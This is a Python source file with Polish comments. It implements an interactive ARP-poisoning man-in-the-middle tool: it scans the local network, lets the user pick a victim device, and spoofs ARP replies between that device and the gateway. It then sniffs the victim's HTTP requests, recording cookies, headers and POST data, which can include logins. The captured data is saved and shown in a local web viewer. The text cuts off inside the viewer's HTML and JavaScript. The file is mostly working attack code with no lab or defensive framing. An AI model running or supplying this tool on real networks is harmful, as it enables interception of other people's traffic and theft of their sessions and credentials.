from scapy.sendrecv import srp, send, sniff
from scapy.layers.http import HTTPRequest, HTTPResponse
import scapy.all as scapy
import netifaces
import os
import time
import subprocess
import threading
import http.server
import socketserver
import json
import pickle
from datetime import datetime
from domain_resolver import improve_url_identification
import gzip


class NetworkSniffer:
    def __init__(self):
        self.interfaces = self.get_interfaces()
        self.selected_interface = None
        self.devices = []
        self.selected_device = None
        self.captured_data = {}
        self.stop_sniffing = False
        self.sniffing_thread = None
        self.spoofing_thread = None
        self.gateway_ip = None
        self._test_scapy_imports()
        self.enable_ip_forwarding()

    def get_full_html_content(self, url):
        """
        Próbuje zebrać pełną zawartość HTML dla danego URL
        """
        try:
            # Znajdź wszystkie żądania i odpowiedzi dla danego URL
            html_responses = []
            for requests in self.captured_data.get(url, []):
                for response in requests.get('responses', []):
                    # Sprawdź, czy odpowiedź zawiera treść HTML
                    if response.get('headers', {}).get('Content-Type', '').startswith('text/html'):
                        html_responses.append(response['content'])

            # Zwróć pierwszą znalezioną odpowiedź HTML lub pustą treść
            return html_responses[0] if html_responses else "<html><body>Nie znaleziono treści HTML</body></html>"

        except Exception as e:
            print(f"Błąd podczas pobierania treści HTML: {e}")
            return "<html><body>Błąd podczas ładowania strony</body></html>"

    def save_captured_data(self):
        """Zapisuje przechwycone dane do pliku"""
        if not self.captured_data:
            print("Brak danych do zapisania.")
            return False

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"captured_data_{timestamp}.pickle"

        # Dodaj statystyki
        url_count = len(self.captured_data)
        request_count = sum(len(requests) for requests in self.captured_data.values())

        print(f"\nPodsumowanie przechwytywania:")
        print(f"- Liczba unikalnych URL/hostów: {url_count}")
        print(f"- Łączna liczba żądań/pakietów: {request_count}")

        if url_count > 0:
            print("\nWykryte hosty/URL:")
            for i, url in enumerate(self.captured_data.keys()):
                req_count = len(self.captured_data[url])
                protocol = "HTTPS" if url.startswith("https://") else "HTTP"
                print(f"  {i + 1}. {protocol} {url} ({req_count} żądań/pakietów)")

        try:
            with open(filename, 'wb') as f:
                pickle.dump(self.captured_data, f)

            print(f"\nDane zapisane w pliku: {filename}")
            return True
        except Exception as e:
            print(f"Błąd podczas zapisywania danych: {e}")
            return False

    def _test_scapy_imports(self):
        """Testuje czy wszystkie potrzebne funkcje z scapy są dostępne"""
        try:
            # Test funkcji srp
            if hasattr(scapy, 'srp'):
                print("Funkcja 'srp' jest dostępna w module scapy")
            else:
                print("UWAGA: Funkcja 'srp' NIE jest dostępna w module scapy!")
                print("Dostępne funkcje w module scapy:", dir(scapy)[:20])

            # Test funkcji sniff
            if hasattr(scapy, 'sniff'):
                print("Funkcja 'sniff' jest dostępna w module scapy")
            else:
                print("UWAGA: Funkcja 'sniff' NIE jest dostępna w module scapy!")

            # Test funkcji ARP
            if hasattr(scapy, 'ARP'):
                print("Klasa 'ARP' jest dostępna w module scapy")
            else:
                print("UWAGA: Klasa 'ARP' NIE jest dostępna w module scapy!")

            # Test funkcji Ether
            if hasattr(scapy, 'Ether'):
                print("Klasa 'Ether' jest dostępna w module scapy")
            else:
                print("UWAGA: Klasa 'Ether' NIE jest dostępna w module scapy!")

        except Exception as e:
            print(f"Błąd podczas testowania importów scapy: {e}")

    def enable_ip_forwarding(self):
        """Włącza przekazywanie pakietów IP (potrzebne dla ARP poisoning)"""
        try:
            if os.name == 'posix':  # Linux/Mac
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                print("Włączono przekazywanie pakietów IP.")
            elif os.name == 'nt':  # Windows
                os.system(
                    "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" /v \"IPEnableRouter\" /t REG_DWORD /d 1 /f")
                print("Włączono przekazywanie pakietów IP. Może być wymagany restart.")
        except Exception as e:
            print(f"Nie udało się włączyć przekazywania pakietów IP: {e}")
            print("Przechwytywanie może nie działać prawidłowo.")

    def get_interfaces(self):
        """Pobiera listę dostępnych interfejsów sieciowych"""
        interfaces = []
        for iface in netifaces.interfaces():
            try:
                # Pobierz adres IP każdego interfejsu
                ifaddresses = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in ifaddresses:
                    ip = ifaddresses[netifaces.AF_INET][0]['addr']
                    interfaces.append({'name': iface, 'ip': ip})
            except Exception as e:
                print(f"Błąd podczas pobierania informacji o interfejsie {iface}: {e}")
        return interfaces

    def show_interfaces(self):
        """Wyświetla dostępne interfejsy sieciowe"""
        print("\n==== Dostępne interfejsy sieciowe ====")
        for i, iface in enumerate(self.interfaces):
            print(f"{i + 1}. {iface['name']} - {iface['ip']}")

        try:
            choice_input = input("\nWybierz interfejs (numer): ")
            choice = int(choice_input) - 1
            if 0 <= choice < len(self.interfaces):
                self.selected_interface = self.interfaces[choice]
                print(f"Wybrano interfejs: {self.selected_interface['name']}")
                return True
            else:
                print("Nieprawidłowy wybór. Numer poza zakresem.")
                return False
        except ValueError:
            print("Nieprawidłowy wybór. Wprowadź liczbę.")
            return False

    def scan_network(self):
        """Skanuje sieć lokalną w poszukiwaniu urządzeń"""
        if not self.selected_interface:
            print("Najpierw wybierz interfejs sieciowy.")
            return False

        print(f"\nSkanowanie sieci za pomocą {self.selected_interface['name']}...")

        # Utwórz adres sieci na podstawie adresu IP
        ip_parts = self.selected_interface['ip'].split('.')
        network_address = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

        try:
            # Utwórz pakiet ARP
            arp_request = scapy.ARP(pdst=network_address)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request

            # Wyślij pakiet i odbierz odpowiedź
            print("Wysyłanie pakietów ARP, proszę czekać...")
            answered_list = srp(arp_request_broadcast, timeout=5, verbose=0, retry=2)[0]

            # Przetwórz odpowiedzi
            self.devices = []
            print(f"Znaleziono {len(answered_list)} urządzeń:")

            for element in answered_list:
                device = {
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc,
                    "hostname": "Unknown"
                }

                # Uproszczona próba uzyskania nazwy hosta bez używania nslookup
                try:
                    import socket
                    hostname = socket.getfqdn(device["ip"])
                    if hostname != device["ip"]:  # getfqdn czasem zwraca sam adres IP
                        device["hostname"] = hostname
                except:
                    pass

                self.devices.append(device)
                print(f"  * {device['ip']} ({device['mac']})")

            if not self.devices:
                print("Nie znaleziono żadnych urządzeń w sieci.")
                return False

            return True
        except Exception as e:
            print(f"Błąd podczas skanowania sieci: {e}")
            print("Sprawdź, czy masz uprawnienia administratora/roota do wykonania tego polecenia.")
            return False

    def show_devices(self):
        """Wyświetla znalezione urządzenia"""
        print("\n==== Znalezione urządzenia ====")
        for i, device in enumerate(self.devices):
            print(f"{i + 1}. IP: {device['ip']} - MAC: {device['mac']} - Nazwa: {device.get('hostname', 'Unknown')}")

        try:
            choice_input = input("\nWybierz urządzenie do monitorowania (numer): ")
            choice = int(choice_input) - 1
            if 0 <= choice < len(self.devices):
                self.selected_device = self.devices[choice]
                print(f"Wybrano urządzenie: {self.selected_device['ip']}")
                return True
            else:
                print("Nieprawidłowy wybór. Numer poza zakresem.")
                return False
        except ValueError:
            print("Nieprawidłowy wybór. Wprowadź liczbę.")
            return False

    def packet_callback(self, packet):
        """Callback dla przechwyconych pakietów"""
        if self.stop_sniffing:
            return

        try:
            # Przechwytywanie żądań HTTP
            if packet.haslayer(HTTPRequest):
                # Pobierz URL
                try:
                    url = packet[HTTPRequest].Host.decode(errors='ignore') + packet[HTTPRequest].Path.decode(
                        errors='ignore')
                except:
                    url = "unknown-host/path"

                # Pobierz metodę HTTP
                try:
                    method = packet[HTTPRequest].Method.decode(errors='ignore')
                except:
                    method = "UNKNOWN"

                # Pobierz nagłówki
                headers = {}
                for field in packet[HTTPRequest].fields:
                    if field not in ['Method', 'Path', 'Http-Version']:
                        try:
                            headers[field] = packet[HTTPRequest].fields[field].decode(errors='ignore')
                        except:
                            headers[field] = str(packet[HTTPRequest].fields[field])

                # Sprawdź czy są ciasteczka
                cookies = {}
                if 'Cookie' in headers:
                    cookie_str = headers['Cookie']
                    cookie_parts = cookie_str.split(';')
                    for part in cookie_parts:
                        if '=' in part:
                            key, value = part.split('=', 1)
                            cookies[key.strip()] = value.strip()

                # Pobierz dane POST jeśli istnieją
                post_data = None
                if method == 'POST' and packet.haslayer(scapy.Raw):
                    post_data = packet[scapy.Raw].load.decode(errors='ignore')

                # Pobierz IP
                if packet.haslayer(scapy.IP):
                    src_ip = packet[scapy.IP].src
                    dst_ip = packet[scapy.IP].dst
                else:
                    src_ip = dst_ip = "unknown"

                # Timestamp
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                # Utwórz wpis żądania
                request_data = {
                    'timestamp': timestamp,
                    'method': method,
                    'url': url,
                    'headers': headers,
                    'cookies': cookies,
                    'post_data': post_data,
                    'protocol': 'HTTP',
                    'src_ip': src_ip,
                    'dst_ip': dst_ip,
                    'responses': []  # Lista na odpowiedzi
                }

                # Dodaj do przechwyconych danych
                if url not in self.captured_data:
                    self.captured_data[url] = []

                self.captured_data[url].append(request_data)

            # Przechwytywanie odpowiedzi HTTP
            elif packet.haslayer(HTTPResponse):
                if packet.haslayer(scapy.Raw):
                    try:
                        # Nagłówki odpowiedzi
                        response_headers = {}
                        for field in packet[HTTPResponse].fields:
                            try:
                                response_headers[field] = packet[HTTPResponse].fields[field].decode(errors='ignore')
                            except:
                                response_headers[field] = str(packet[HTTPResponse].fields[field])

                        # Treść odpowiedzi
                        # Treść odpowiedzi
                        raw_content = packet[scapy.Raw].load  # Surowe dane binarne

                        # Sprawdzenie, czy odpowiedź jest skompresowana gzipem
                        if 'Content-Encoding' in response_headers and 'gzip' in response_headers[
                            'Content-Encoding'].lower():
                            try:
                                response_content = gzip.decompress(raw_content).decode('utf-8', errors='replace')
                                print("Odpowiedź była skompresowana gzipem, została zdekompresowana.")
                            except Exception as e:
                                print(f"Błąd dekompresji: {e}")
                                response_content = raw_content  # W razie błędu zwróć oryginalne dane
                        else:
                            response_content = raw_content.decode(
                                errors='backslashreplace')  # Standardowy dekodowany tekst

                        # Dodaj odpowiedź do ostatniego żądania
                        for url, requests in self.captured_data.items():
                            for request in requests:
                                # Dodaj odpowiedź do żądania
                                response_entry = {
                                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                    'headers': response_headers,
                                    'content': response_content,
                                    'content_length': len(response_content)
                                }

                                request['responses'].append(response_entry)
                                print(f"Przechwycono odpowiedź HTTP dla {url}: {len(response_content)} bajtów")
                                break

                    except Exception as decode_err:
                        print(f"Błąd podczas dekodowania odpowiedzi: {decode_err}")

        except Exception as e:
            print(f"Błąd podczas analizy pakietu: {e}")
            import traceback
            traceback.print_exc()

    def reconstruct_page(self, url):
        """
        Rekonstruuje pełną stronę z przechwyconych zasobów

        Args:
            url (str): Główny adres URL strony

        Returns:
            dict: Słownik z rekonstruowaną stroną
        """
        if url not in self.captured_data:
            return None

        # Główny dokument HTML
        main_html = None
        stylesheets = []
        scripts = []

        # Sortuj żądania chronologicznie
        requests = sorted(self.captured_data[url], key=lambda x: x.get('timestamp', ''))

        for request in requests:
            # Sprawdź odpowiedzi
            for response in request.get('responses', []):
                content_type = response.get('content_type', '')

                # Główny dokument HTML
                if 'text/html' in content_type and not main_html:
                    main_html = response['content']

                # Arkusze stylów
                elif 'text/css' in content_type:
                    stylesheets.append({
                        'url': request['url'],
                        'content': response['content']
                    })

                # Skrypty JavaScript
                elif 'javascript' in content_type:
                    scripts.append({
                        'url': request['url'],
                        'content': response['content']
                    })

        # Rekonstrukcja strony
        if main_html:
            # Wstrzyknij style do HEAD
            style_tags = '\n'.join([
                f'<link rel="stylesheet" href="{s["url"]}">'
                for s in stylesheets
            ])
            main_html = main_html.replace('</head>', f'{style_tags}</head>')

            # Dołącz skrypty na końcu body
            script_tags = '\n'.join([
                f'<script src="{s["url"]}"></script>'
                for s in scripts
            ])
            main_html = main_html.replace('</body>', f'{script_tags}</body>')

        return {
            'html': main_html,
            'stylesheets': stylesheets,
            'scripts': scripts
        }

    def _sanitize_data(self, data):
        """Oczyszczanie danych z potencjalnie niebezpiecznych znaków"""
        import re
        if isinstance(data, str):
            # Usuń znaki sterujące i niepożądane sekwencje
            return re.sub(r'[\x00-\x1F\x7F]', '', data)
        return data

    def get_gateway_ip(self):
        """Pobiera adres IP bramy sieciowej"""
        try:
            # Próba 1: Użycie netifaces (najbardziej niezawodna metoda)
            try:
                if not self.selected_interface:
                    print("Nie wybrano interfejsu sieciowego.")
                    return None

                # Pobierz informacje o wybranym interfejsie
                gateways = netifaces.gateways()

                # Sprawdź domyślną bramę
                if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                    gateway_ip, interface = gateways['default'][netifaces.AF_INET]
                    # Sprawdź, czy to brama dla wybranego interfejsu
                    if interface == self.selected_interface['name']:
                        print(f"Wykryto bramę sieciową: {gateway_ip} dla interfejsu {interface}")
                        return gateway_ip

                # Jeśli nie znaleziono domyślnej bramy dla wybranego interfejsu,
                # poszukaj bramy specyficznej dla interfejsu
                interface_name = self.selected_interface['name']
                if interface_name in gateways:
                    for gateway_info in gateways[interface_name]:
                        if gateway_info[1] == interface_name and gateway_info[2]:  # Jeśli jest domyślna
                            print(f"Wykryto bramę sieciową: {gateway_info[0]} dla interfejsu {interface_name}")
                            return gateway_info[0]

                # Próba 2: Oblicz prawdopodobną bramę na podstawie adresu IP i maski
                # Typowo brama to pierwszy adres w sieci lub ostatni
                try:
                    ip_parts = self.selected_interface['ip'].split('.')
                    # Typowa brama dla sieci domowej to x.x.x.1 lub x.x.x.254
                    gateway_guess = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
                    print(f"Nie wykryto bramy automatycznie. Używam domyślnej dla sieci domowej: {gateway_guess}")
                    return gateway_guess
                except:
                    pass

            except Exception as e:
                print(f"Błąd podczas wykrywania bramy za pomocą netifaces: {e}")

            # Próba 3: Użycie poleceń systemowych jako fallback
            if os.name == 'posix':  # Linux/Mac
                # Różne polecenia dla Linuxa
                commands = [
                    "ip route | grep default | awk '{print $3}'",
                    "route -n | grep '^0.0.0.0' | awk '{print $2}'",
                    "netstat -rn | grep '^0.0.0.0' | awk '{print $2}'"
                ]

                for cmd in commands:
                    try:
                        gw = os.popen(cmd).read().strip()
                        if gw and len(gw) > 0:
                            print(f"Wykryto bramę sieciową: {gw}")
                            return gw
                    except:
                        continue

            elif os.name == 'nt':  # Windows
                try:
                    # Bardziej niezawodna metoda dla Windows
                    output = subprocess.check_output('ipconfig', text=True)
                    for line in output.split('\n'):
                        if 'Default Gateway' in line:
                            gw = line.split(':')[-1].strip()
                            if gw and gw != "" and not "Media disconnected" in line:
                                print(f"Wykryto bramę sieciową: {gw}")
                                return gw
                except:
                    pass

            # Próba 4: Pytanie użytkownika
            print("Nie udało się automatycznie wykryć bramy sieciowej.")
            gw = input("Podaj ręcznie adres IP bramy sieciowej (np. 192.168.1.1): ").strip()
            if gw:
                return gw

            return None
        except Exception as e:
            print(f"Nie udało się wykryć bramy sieciowej: {e}")
            print("Spróbuj określić adres bramy ręcznie.")
            gw = input("Podaj adres IP bramy sieciowej (np. 192.168.1.1): ").strip()
            return gw if gw else None

    def arp_spoof(self, target_ip, gateway_ip):
        """Przeprowadza ARP poisoning między urządzeniem docelowym a bramą sieciową"""
        target_mac = None
        gateway_mac = None

        # Pobierz adresy MAC
        for device in self.devices:
            if device['ip'] == target_ip:
                target_mac = device['mac']
            if device['ip'] == gateway_ip:
                gateway_mac = device['mac']

        if not target_mac:
            print(f"Nie znaleziono adresu MAC dla {target_ip}")
            # Próba pobrania MAC bezpośrednio
            target_mac = self.get_mac(target_ip)
            if not target_mac:
                return False

        if not gateway_mac:
            print(f"Nie znaleziono adresu MAC dla bramy {gateway_ip}")
            # Próba pobrania MAC bezpośrednio
            gateway_mac = self.get_mac(gateway_ip)
            if not gateway_mac:
                return False

        print(f"Rozpoczęcie ARP poisoning między {target_ip} a {gateway_ip}")

        try:
            while not self.stop_sniffing:
                # Stwórz pakiety dla warstwy Ethernet i ARP
                # Mów urządzeniu docelowemu, że jesteś bramą
                ether1 = scapy.Ether(dst=target_mac)
                arp1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                packet1 = ether1 / arp1

                # Mów bramie, że jesteś urządzeniem docelowym
                ether2 = scapy.Ether(dst=gateway_mac)
                arp2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                packet2 = ether2 / arp2

                # Wyślij pakiety
                send(packet1, verbose=0)
                send(packet2, verbose=0)

                time.sleep(2)  # Interwał wysyłania pakietów
        except Exception as e:
            print(f"Błąd podczas ARP poisoning: {e}")
        finally:
            # Przywróć prawidłowe wpisy ARP
            self.restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

    def get_mac(self, ip):
        """Pobiera adres MAC dla podanego adresu IP"""
        try:
            ans, _ = srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            print(f"Błąd podczas pobierania adresu MAC dla {ip}: {e}")
            return None

    def restore_arp(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Przywraca prawidłowe wpisy ARP po zakończeniu przechwytywania"""
        print("Przywracanie prawidłowych wpisów ARP...")
        try:
            for _ in range(5):  # Wysyłamy kilka pakietów dla pewności
                # Przywróć prawidłowy wpis dla urządzenia docelowego
                ether1 = scapy.Ether(dst=target_mac)
                arp1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
                packet1 = ether1 / arp1

                # Przywróć prawidłowy wpis dla bramy
                ether2 = scapy.Ether(dst=gateway_mac)
                arp2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
                packet2 = ether2 / arp2

                # Wyślij pakiety
                send(packet1, verbose=0)
                send(packet2, verbose=0)

                time.sleep(0.2)
        except Exception as e:
            print(f"Błąd podczas przywracania wpisów ARP: {e}")

    def start_sniffing(self):
        """Rozpoczyna przechwytywanie pakietów"""
        if not self.selected_device:
            print("Najpierw wybierz urządzenie.")
            return False

        print(f"\nRozpoczęcie przechwytywania ruchu dla {self.selected_device['ip']}...")

        # Spytaj użytkownika o tryb przechwytywania
        print("\nWybierz tryb przechwytywania:")
        print("1. Pasywne (tylko obserwacja pakietów urządzenia)")
        print("2. Aktywne (ARP poisoning - wymaga uprawnień administratora)")

        try:
            mode = input("Wybierz tryb (1/2): ").strip()

            self.stop_sniffing = False
            use_arp_spoofing = (mode == "2")

            # Jeśli użytkownik wybrał ARP poisoning
            if use_arp_spoofing:
                # Pobierz adres bramy, jeśli nie jest już znany
                if not self.gateway_ip:
                    self.gateway_ip = self.get_gateway_ip()

                if not self.gateway_ip:
                    print("Nie można przeprowadzić ARP poisoning bez adresu bramy.")
                    print("Przełączanie na tryb pasywny.")
                    use_arp_spoofing = False
                else:
                    # Uruchom wątek ARP spoofing
                    print(f"Rozpoczynanie ARP poisoning dla {self.selected_device['ip']}...")
                    self.spoofing_thread = threading.Thread(
                        target=self.arp_spoof,
                        args=(self.selected_device['ip'], self.gateway_ip)
                    )
                    self.spoofing_thread.daemon = True
                    self.spoofing_thread.start()

            # Funkcja do przechwytywania w osobnym wątku
            def sniff_thread():
                try:
                    # Jeśli używamy ARP poisoning, przechwytujemy wszystkie pakiety
                    if use_arp_spoofing:
                        filter_str = f"host {self.selected_device['ip']}"
                    else:
                        # Bardziej szczegółowy filtr dla portów HTTP i HTTPS
                        filter_str = f"host {self.selected_device['ip']} and tcp and (port 80 or port 443)"

                    print(f"Używany filtr: {filter_str}")
                    print(f"Rozpoczęto przechwytywanie ruchu. Wyniki będą wyświetlane na bieżąco.")
                    print(f"Oczekiwanie na pakiety...")

                    # Uruchom przechwytywanie
                    sniff(
                        filter=filter_str,
                        prn=self.packet_callback,
                        store=0,
                        stop_filter=lambda p: self.stop_sniffing
                    )
                except Exception as e:
                    print(f"Błąd podczas przechwytywania: {e}")
                    import traceback
                    traceback.print_exc()

            # Uruchomienie wątku przechwytywania
            self.sniffing_thread = threading.Thread(target=sniff_thread)
            self.sniffing_thread.daemon = True
            self.sniffing_thread.start()

            print("Wpisz 'st' i naciśnij Enter, aby zatrzymać przechwytywanie.")

            # Oczekiwanie na polecenie zatrzymania
            try:
                while True:
                    command = input("Wpisz 'st' aby zatrzymać przechwytywanie: ")
                    if command.lower().strip() == 'st':
                        break
                    time.sleep(0.5)
            finally:
                print("\nZatrzymywanie przechwytywania...")
                self.stop_sniffing = True

                # Zaczekaj na zakończenie wątków
                if self.sniffing_thread.is_alive():
                    self.sniffing_thread.join(timeout=2)

                if use_arp_spoofing and self.spoofing_thread and self.spoofing_thread.is_alive():
                    self.spoofing_thread.join(timeout=2)

                print("Przechwytywanie zatrzymane.")

                # Zapisz dane
                if self.captured_data:
                    self.save_captured_data()
                else:
                    print("Nie przechwycono żadnych danych.")

                return True

        except Exception as e:
            print(f"\nBłąd podczas przechwytywania: {e}")
            self.stop_sniffing = True

            # Zatrzymaj wątki
            if hasattr(self, 'sniffing_thread') and self.sniffing_thread and self.sniffing_thread.is_alive():
                self.sniffing_thread.join(timeout=2)

            if hasattr(self, 'spoofing_thread') and self.spoofing_thread and self.spoofing_thread.is_alive():
                self.spoofing_thread.join(timeout=2)

            return False

    def start_session_browser(self):
        """Uruchamia przeglądarkę sesji"""
        print("Uruchamianie przeglądarki sesji na porcie 8000...")

        if not self.captured_data or len(self.captured_data) == 0:
            print("Błąd: Brak danych do wyświetlenia.")
            return False

        try:
            # Zapisz dane do pliku tymczasowego dla przeglądarki
            with open('temp_session_data.json', 'w', encoding='utf-8') as f:
                # Konwertuj dane do formatu JSON
                json_data = {}
                for url, requests in self.captured_data.items():
                    json_data[url] = []
                    for req in requests:
                        # Przygotuj kopię danych żądania, aby zmodyfikować
                        req_copy = dict(req)

                        # Konwertuj timestamp na string jeśli jest obiektem datetime
                        if isinstance(req_copy.get('timestamp'), datetime):
                            req_copy['timestamp'] = req_copy['timestamp'].strftime("%Y-%m-%d %H:%M:%S")

                        # Upewnij się, że wszystkie wartości są serializowalne
                        for key, value in list(req_copy.items()):
                            if isinstance(value, (dict, list)):
                                try:
                                    # Sprawdź czy struktura jest serializowalna
                                    json.dumps(value)
                                except:
                                    # Jeśli nie, przekonwertuj na string
                                    req_copy[key] = str(value)

                        json_data[url].append(req_copy)

                json.dump(json_data, f, indent=2, default=str)

            # Utwórz prosty serwer HTTP
            class SessionHandler(http.server.SimpleHTTPRequestHandler):
                def do_GET(self):
                    # Obsługa favicon.ico
                    if self.path == '/favicon.ico':
                        # Zwróć pustą ikonę lub zignoruj żądanie
                        self.send_response(204)  # No Content
                        self.end_headers()
                        return None

                    if self.path == '/':
                        self.path = '/session_browser.html'
                    elif self.path == '/data':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        with open('temp_session_data.json', 'rb') as f:
                            self.wfile.write(f.read())
                        return

                    return http.server.SimpleHTTPRequestHandler.do_GET(self)

            # Utwórz plik HTML dla przeglądarki sesji
            with open('session_browser.html', 'w', encoding='utf-8') as f:
                f.write('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Przeglądarka sesji</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 0; 
                padding: 20px; 
                background-color: #f4f4f4;
            }
            .container {
                display: flex;
                max-width: 1600px;
                margin: 0 auto;
                gap: 20px;
            }
            .url-list {
                width: 300px;
                background-color: white;
                border-radius: 5px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                max-height: 800px;
                overflow-y: auto;
                padding: 10px;
            }
            .url-item {
                padding: 10px;
                border-bottom: 1px solid #eee;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            .url-item:hover, .url-item.selected {
                background-color: #f0f0f0;
            }
            .details-panel {
                flex-grow: 1;
                background-color: white;
                border-radius: 5px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                padding: 20px;
                max-height: 800px;
                overflow-y: auto;
            }
            .request-details {
                margin-bottom: 20px;
                border: 1px solid #ddd;
                padding: 15px;
                border-radius: 5px;
            }
            .method-badge {
                display: inline-block;
                padding: 5px 10px;
                border-radius: 3px;
                font-weight: bold;
                margin-right: 10px;
            }
            .method-GET { background-color: #4CAF50; color: white; }
            .method-POST { background-color: #2196F3; color: white; }
            .method-OTHER { background-color: #FF9800; color: white; }
            pre {
                background-color: #f4f4f4;
                padding: 10px;
                border-radius: 5px;
                max-height: 500px;
                overflow-y: auto;
                white-space: pre-wrap;
                word-wrap: break-word;
            }
            .content-buttons {
                margin-bottom: 10px;
                display: flex;
                gap: 10px;
            }
            .content-buttons button {
                padding: 5px 10px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 3px;
                cursor: pointer;
            }
            .content-buttons button:nth-child(2) {
                background-color: #2196F3;
            }
            .content-buttons button:nth-child(3) {
                background-color: #FF5722;
            }
            .content-container {
                position: relative;
            }
            .content-container iframe {
                width: 100%;
                height: 600px;
                border: 1px solid #ddd;
            }
            .full-page-btn {
                margin-top: 10px;
                padding: 10px;
                background-color: #FF5722;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="url-list" id="urlList"></div>
            <div class="details-panel" id="detailsPanel">
                <h2>Wybierz połączenie, aby zobaczyć szczegóły</h2>
            </div>
        </div>

        <script>
            fetch('/data')
                .then(response => response.json())
                .then(sessionData => {
                    const urlList = document.getElementById('urlList');
                    const detailsPanel = document.getElementById('detailsPanel');

                    // Generowanie listy URL
                    Object.keys(sessionData).forEach(url => {
                        const urlItem = document.createElement('div');
                        urlItem.className = 'url-item';
                        urlItem.textContent = url;
                        urlItem.onclick = () => {
                            // Zaznacz aktywny URL
                            document.querySelectorAll('.url-item').forEach(el => 
                                el.classList.remove('selected')
                            );
                            urlItem.classList.add('selected');

                            // Wyświetl szczegóły
                            renderUrlDetails(url, sessionData[url]);
                        };
                        urlList.appendChild(urlItem);
                    });

                    function renderUrlDetails(url, requests) {
                        detailsPanel.innerHTML = `<h2>${url}</h2>`;

                        // Dodaj przycisk pełnej strony
                        const fullPageAllBtn = document.createElement('button');
                        fullPageAllBtn.textContent = 'Pełna strona (wszystkie dane)';
                        fullPageAllBtn.className = 'full-page-btn';
                        fullPageAllBtn.onclick = () => {
                            const fullPageIframe = document.createElement('iframe');
                            fullPageIframe.style.width = '100%';
                            fullPageIframe.style.height = '800px';
                            fullPageIframe.style.border = '1px solid #ddd';

                            // Zbierz wszystkie treści HTML
                            let fullContent = requests.reduce((acc, req) => {
                                const htmlResponses = req.responses.filter(resp => 
                                    resp.content && 
                                    (resp.content.includes('<!DOCTYPE html>') || 
                                     resp.content.includes('<html'))
                                );
                                return acc + (htmlResponses[0]?.content || '');
                            }, '');

                            fullPageIframe.srcdoc = fullContent || '<html><body>Brak treści</body></html>';

                            const fullPageContainer = document.createElement('div');
                            fullPageContainer.style.marginTop = '15px';
                            fullPageContainer.appendChild(fullPageIframe);

                            detailsPanel.appendChild(fullPageContainer);
                        };

                        detailsPanel.appendChild(fullPageAllBtn);

                        requests.forEach((request, index) => {
                            const requestBlock = document.createElement('div');
                            requestBlock.className = 'request-details';

                            // Badge metody
                            const methodBadge = document.createElement('span');
                            methodBadge.className = `method-badge method-${request.method || 'OTHER'}`;
                            methodBadge.textContent = request.method || 'UNKNOWN';
                            requestBlock.appendChild(methodBadge);

                            // Nagłówek
                            const headerInfo = document.createElement('div');
                            headerInfo.innerHTML = `
                                <p><strong>Timestamp:</strong> ${request.timestamp}</p>
                                <p><strong>Źródło:</strong> ${request.src_ip} → <strong>Cel:</strong> ${request.dst_ip}</p>
                            `;
                            requestBlock.appendChild(headerInfo);

                            // Nagłówki żądania
                            if (request.headers && Object.keys(request.headers).length > 0) {
                                const headersTitle = document.createElement('div');
                                headersTitle.textContent = 'Nagłówki żądania';
                                headersTitle.style.fontWeight = 'bold';
                                headersTitle.style.marginTop = '10px';
                                requestBlock.appendChild(headersTitle);

                                const headersPre = document.createElement('pre');
                                headersPre.textContent = JSON.stringify(request.headers, null, 2);
                                requestBlock.appendChild(headersPre);
                            }

                            // Dane POST
                            if (request.post_data) {
                                const postTitle = document.createElement('div');
                                postTitle.textContent = 'Dane POST';
                                postTitle.style.fontWeight = 'bold';
                                postTitle.style.marginTop = '10px';
                                requestBlock.appendChild(postTitle);

                                const postPre = document.createElement('pre');
                                postPre.textContent = request.post_data;
                                requestBlock.appendChild(postPre);
                            }

                            // Odpowiedzi
                            if (request.responses && request.responses.length > 0) {
                                request.responses.forEach((response, respIndex) => {
                                    const responsesTitle = document.createElement('div');
                                    responsesTitle.textContent = `Odpowiedź #${respIndex + 1}`;
                                    responsesTitle.style.fontWeight = 'bold';
                                    responsesTitle.style.marginTop = '10px';
                                    requestBlock.appendChild(responsesTitle);

                                    // Nagłówki odpowiedzi
                                    if (response.headers && Object.keys(response.headers).length > 0) {
                                        const responseHeadersTitle = document.createElement('div');
                                        responseHeadersTitle.textContent = 'Nagłówki odpowiedzi';
                                        responseHeadersTitle.style.fontWeight = 'bold';
                                        requestBlock.appendChild(responseHeadersTitle);

                                        const responseHeadersPre = document.createElement('pre');
                                        responseHeadersPre.textContent = JSON.stringify(response.headers, null, 2);
                                        requestBlock.appendChild(responseHeadersPre);
                                    }

                                    // Treść odpowiedzi
                                    if (response.content) {
                                        const contentTitle = document.createElement('div');
